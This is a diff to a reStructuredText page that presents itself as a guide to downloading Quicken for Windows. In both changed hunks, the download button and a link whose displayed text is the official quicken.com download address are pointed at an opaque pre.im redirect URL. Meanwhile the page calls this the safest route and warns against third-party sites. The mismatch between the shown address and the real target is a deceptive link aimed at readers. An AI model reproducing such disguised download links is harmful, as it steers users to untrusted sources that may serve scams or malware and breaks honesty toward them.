@@ -6,7 +6,7 @@ If you're ready to `download Quicken <https://www.quicken.com/download>`_ and in
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://pre.im/?16PdXoJYcxJv6EcMvvKTemVRWqAT7C80EaYyTYYJkYyYzJr2NQjFf0fo2bDEFwizxTewO4sLusqq" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken for Windows
         </a>
     </div>
@@ -41,7 +41,7 @@ Before starting the Quicken download, ensure:
 
 Visit the official Quicken website:
 
-👉 `https://www.quicken.com/download <https://www.quicken.com/download>`_
+👉 `https://www.quicken.com/download <https://pre.im/?16PdXoJYcxJv6EcMvvKTemVRWqAT7C80EaYyTYYJkYyYzJr2NQjFf0fo2bDEFwizxTewO4sLusqq>`_
 
 This is the safest and most secure way to start your Quicken download. Avoid third-party websites or unofficial sources.
 
